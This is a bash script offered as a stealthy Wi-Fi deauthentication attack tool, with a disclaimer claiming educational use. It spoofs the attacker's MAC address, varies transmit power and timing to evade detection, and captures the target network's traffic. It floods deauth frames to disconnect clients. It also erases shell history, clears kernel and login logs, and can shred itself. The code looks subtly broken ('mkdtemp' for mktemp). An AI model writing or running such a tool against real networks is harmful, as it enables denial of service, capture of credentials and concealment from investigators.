#!/bin/bash
# -----------------------------------------------------------------------------
# Author: wellatleastitried
# -----------------------------------------------------------------------------
# DISCLAIMER
# -----------------------------------------------------------------------------
# This script is provided for educational and authorized security testing only.
# You are solely responsible for ensuring that your use of this script complies
# with all applicable laws, regulations, and terms of service.
#
# The author assumes NO LIABILITY and NO RESPONSIBILITY for any misuse, damage,
# unauthorized access, disruption of service, or illegal activity resulting from
# the use of this script.
#
# By using this script, you acknowledge that:
# - You understand the potential impact of the actions it performs;
# - You have explicit permission to use it in the target environment;
# - You accept full responsibility for any consequences arising from its use.
#
# If you do not agree to these terms, you are prohibited from using this script.
# -----------------------------------------------------------------------------

unset HISTFILE
HISTSIZE=0
HISTFILESIZE=0
export HISTFILE=/dev/null

[ -n "$ZSH_VERSION" ] && HISTFILE=/dev/null && unsetopt share_history

set -e

if [ "$EUID" -ne 0 ]; then
    echo "[!] Please run as root"
    exit 1
fi

IFACE="wlan0"
CHANNEL=""
TARGET_AP=""
TARGET_CLIENT=""
COUNT="10"
DELAY="0.1"
STEALTH="medium"
RANDOM_POS=false
SELF_DESTRUCT=false

while getopts "i:c:a:t:n:d:s:r:xh" opt; do
    case $opt in
        i) IFACE="$OPTARG" ;;
        c) CHANNEL="$OPTARG" ;;
        a) TARGET_AP="$OPTARG" ;;
        t) TARGET_CLIENT="$OPTARG" ;;
        n) COUNT="$OPTARG" ;;
        d) DELAY="$OPTARG" ;;
        s) STEALTH="$OPTARG" ;;
        r) RANDOM_POS=true ;;
        x) SELF_DESTRUCT=true ;;
        h) echo "Usage: $0 [-i interface] [-c channel] [-a target_ap] [-t target_client] [-n count] [-d delay] [-s stealth] [-r randomize_position] [-x self-destruct]" && exit 0 ;;
        *) exit 1 ;;
    esac
done

[[ -z "$TARGET_AP" ]] && echo "[!] Missing target AP (-a)" && exit 1
[[ -z "$CHANNEL" ]] && echo "[!] Missing channel (-c)" && exit 1

ORIGINAL_MAC=$(cat /sys/class/net/$IFACE/address 2>/dev/null || echo "UNKNOWN")
IS_MONITOR=$(iw dev $IFACE info 2>/dev/null | grep -q "type monitor" && echo true || echo false)

TMPDIR=$(mkdtemp -d)
echo "ORIGINAL_MAC=$ORIGINAL_MAC" > "$TMPDIR/stealthDeauthState"
echo "IS_MONITOR=$IS_MONITOR" >> "$TMPDIR/stealthDeauthState"
echo "IFACE=$IFACE" >> "$TMPDIR/stealthDeauthState"

function cleanup() {
    echo "[*] Restoring original state..."

    if [[ "$IS_MONITOR" == "true" ]]; then
        ip link set $IFACE down 2>/dev/null || true
        iw dev $IFACE set type managed 2>/dev/null || true
        ip link set $IFACE up 2>/dev/null || true
    fi
    ip link set $IFACE down 2>/dev/null || true
    ip link set dev $IFACE address $ORIGINAL_MAC 2>/dev/null || true
    ip link set $IFACE up 2>/dev/null || true
    iwconfig $IFACE txpower auto 2>/dev/null || true
    rm -rf "$TMPDIR"

    if [[ "$SELF_DESTRUCT" == true ]]; then
        shred --iterations=50 --zero --random-source=/dev/urandom -u "$0" 2>/dev/null || echo "[!] Self-destruct failed, this will have to be done manually"
        sync
        history -d $(history 1 | awk '{print $1}') 2>/dev/null
    fi
    echo "[+] Cleanup completed."
}

trap cleanup EXIT INT TERM

function apply_stealth() {
    echo "[*] Applying stealth level: $STEALTH"
    ip link set $IFACE down 2>/dev/null || true
    SAMSUNG_OUI="58:CB:52"
    NEW_MAC="${SAMSUNG_OUI}:$(openssl rand -hex 3 | sed 's/\(..\)/\1:/g; s/.$//')"
    ip link set dev $IFACE address $NEW_MAC 2>/dev/null ||
    macchanger --mac=$NEW_MAC $IFACE 2>/dev/null ||
    echo "[!] Failed to change MAC - detection risk increased"

    case $STEALTH in
        low) ;;
        medium)
            iwconfig $IFACE txpower 5 2>/dev/null || true
            DELAY=$(echo "$DELAY + 0.$(( RANDOM % 20 ))" | bc)
            ;;
        high)
            iwconfig $IFACE txpower 1 2>/dev/null || true
            iwconfig $IFACE rate 1M fixed 2>/dev/null || true
            COUNT=$(( COUNT * 2 ))
            DELAY=$(echo "$DELAY + 0.$(( RANDOM % 50 ))" | bc)
            ;;
    esac
    ip link set $IFACE up 2>/dev/null || true
    CURRENT_MAC=$(cat /sys/class/net/$IFACE/address 2>/dev/null || echo "UNKNOWN")
    echo "[*] Current MAC: $CURRENT_MAC"
}

function enable_monitor() {
    echo "[*] Setting up monitor mode on channel $CHANNEL..."

    if ! iw dev $IFACE info 2>/dev/null | grep -q "type monitor"; then
        ip link set $IFACE down
        iw dev $IFACE set type monitor
        ip link set $IFACE up
    fi
    iw dev $IFACE set channel $CHANNEL
}

function start_capture() {
    echo "[*] Starting packet capture..."
    
    [ ! -d "$(pwd)"/cap ] && mkdir -p "$(pwd)"/cap

    if [[ "$STEALTH" == "high" ]]; then
        nohup airodump-ng --bssid "$TARGET_AP" -c "$CHANNEL" --write "$(pwd)/capture" --output-format pcap "$IFACE" >/dev/null 2>&1 &
        echo $! > /tmp/adump.pid
    else
        nohup airodump-ng --bssid "$TARGET_AP" -c "$CHANNEL" --write "$(pwd)/capture" --output-format pcap "$IFACE" &
        echo $! > /tmp/adump.pid
    fi
    echo "[*] Capture started, PID: $(cat /tmp/adump.pid)"
}

function send_deauth() {
    echo "[*] Sending deauth packets..."

    if [[ "$RANDOM_POS" == true ]]; then
        for ((i=1; i<=$COUNT; i++)); do
            if [[ $((RANDOM % 3)) -eq 0 ]]; then
                NEW_POWER=$((RANDOM % 10 + 1))
                iwconfig $IFACE txpower $NEW_POWER 2>/dev/null || true
            fi

            if [[ -z "$TARGET_CLIENT" ]]; then
                aireplay-ng --deauth 1 -a "$TARGET_AP" "$IFACE" >/dev/null 2>&1
            else
                aireplay-ng --deauth 1 -a "$TARGET_AP" -c "$TARGET_CLIENT" "$IFACE" >/dev/null 2>&1
            fi

            CURR_DELAY=$(echo "$DELAY + 0.$(( RANDOM % 30 ))" | bc)
            sleep $CURR_DELAY
        done
    else
        if [[ -z "$TARGET_CLIENT" ]]; then
            aireplay-ng --deauth $COUNT -a "$TARGET_AP" "$IFACE"
        else
            aireplay-ng --deauth $COUNT -a "$TARGET_AP" -c "$TARGET_CLIENT" "$IFACE"
        fi
    fi
    echo "[*] Deauth attack completed."
}

echo "[*] Starting deauth attack..."

if [[ "$STEALTH" == "high" ]]; then
    echo "[*] Applying additional anti-forensics measures..."
    dmesg -c > /dev/null 2>&1 || true
    [ -w /var/log/lastlog ] && : > /var/log/lastlog 2>/dev/null || true
fi
apply_stealth
enable_monitor
start_capture
send_deauth
echo "[*] Deauth attack finished."
